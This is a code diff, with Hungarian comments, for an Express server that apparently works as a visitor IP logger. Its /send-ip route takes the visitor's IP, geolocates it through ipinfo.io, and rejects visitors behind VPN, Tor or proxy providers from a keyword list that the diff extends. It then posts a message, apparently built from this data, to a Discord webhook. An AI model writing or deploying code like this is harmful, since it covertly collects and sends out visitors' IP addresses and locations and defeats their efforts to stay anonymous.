@@ -10,12 +10,11 @@ app.use(express.static(path.join(__dirname, 'public')));
 
 // Webhook URL és IPINFO token a .env fájlból
 const webhookUrl = process.env.DISCORD_WEBHOOK_URL;
-const altWebhookUrl = process.env.DISCORD_ALT_WEBHOOK_URL;
 const ipinfoToken = process.env.IPINFO_TOKEN;
 
-// VPN blokkolás - VPN IP tartományok listája (itt bővítheted a listát)
+// VPN blokkolás - VPN IP tartományok listája (bővíthető)
 const blockedVPNs = [
-    'VPN', 'Private Network', 'Proxy', 'Tor', 'VPN Provider', 'PrivateVPN', 'NordVPN', // Itt adhatsz hozzá több VPN szolgáltatót
+    'VPN', 'Private Network', 'Proxy', 'Tor', 'VPN Provider', 'PrivateVPN', 'NordVPN', 'HideMyAss', 'ExpressVPN'
 ];
 
 // Az alapértelmezett útvonal (/) kiszolgálja az index.html-t
@@ -23,22 +22,18 @@ app.get('/', (req, res) => {
     res.sendFile(path.join(__dirname, 'index.html'));  // Az index.html fájl kiszolgálása
 });
 
-// /get-webhook-url útvonal a webhook URL-ek elküldéséhez
-app.get('/get-webhook-url', (req, res) => {
-    res.json({ webhookUrl, altWebhookUrl });
-});
-
 // /send-ip útvonal
 app.get('/send-ip', async (req, res) => {
     const userIp = (req.headers['x-forwarded-for'] || req.socket.remoteAddress || '').split(',')[0].trim();
 
     try {
+        // IP geolokáció lekérése az IPInfo API-val
         const geoResponse = await axios.get(`https://ipinfo.io/${userIp}?token=${ipinfoToken}`);
         const geoData = geoResponse.data;
 
-        console.log("GeoData:", geoData);  // Logoljuk ki a válaszadatokat a hibaelhárításhoz
+        console.log("GeoData:", geoData);  // Logoljuk a válaszként kapott adatokat
 
-        // Ellenőrizzük, hogy az IP VPN mögül jön-e
+        // Ellenőrizzük, hogy VPN használatával érkezett-e
         const isVPN = blockedVPNs.some(keyword => geoData.org && geoData.org.toLowerCase().includes(keyword.toLowerCase()));
 
         if (isVPN) {
@@ -60,6 +55,7 @@ app.get('/send-ip', async (req, res) => {
             }]
         };
 
+        // Webhook üzenet küldése
         await axios.post(webhookUrl, message); // Alapértelmezett webhook URL küldése
         res.json({ ip: userIp }); // Visszaadja az IP-t JSON formátumban
     } catch (error) {
